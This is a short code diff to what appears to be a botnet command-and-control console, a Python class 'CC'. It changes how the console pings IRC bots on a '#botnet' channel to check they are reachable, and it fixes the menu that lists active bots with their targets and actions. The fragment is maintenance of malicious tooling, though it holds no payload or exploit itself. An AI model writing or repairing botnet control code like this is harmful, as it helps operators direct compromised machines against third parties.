@@ -123,7 +123,7 @@ class CC:
                     sendMessage(s, f"PRIVMSG bot-{k.replace('.', '-')} #botnet: PING")
                     sleep(1)
                     m = readMessage(s)
-                    if "PONG" not in m:
+                    if not m:
                         print(k, "is not reachable over irc port.")
                         del self.activeBot[k]['irc']
                 except Exception as e:
@@ -383,12 +383,12 @@ class CC:
             match int(comando):
                 case 1:
                     print("Ip\t\thttp\t\tirc")
-                    if not self.activeBot:
+                    if len(self.activeBot) > 0:
                         for k, v in self.activeBot.items():
                             print(f"{k}\t{v['http']}\t\t{v['irc']}")
                 case 2:
                     print("Ip\t\thttp\t\tirc\t\ttarget\t\taction")
-                    if not self.activeBot:
+                    if len(self.activeBot) > 0:
                         for k, v in self.activeBot.items():
                             print(f"{k}\t{v['http']}\t\t{v['irc']}\t\t{v['target']}\t\t{v['action']}")
                 case 3:
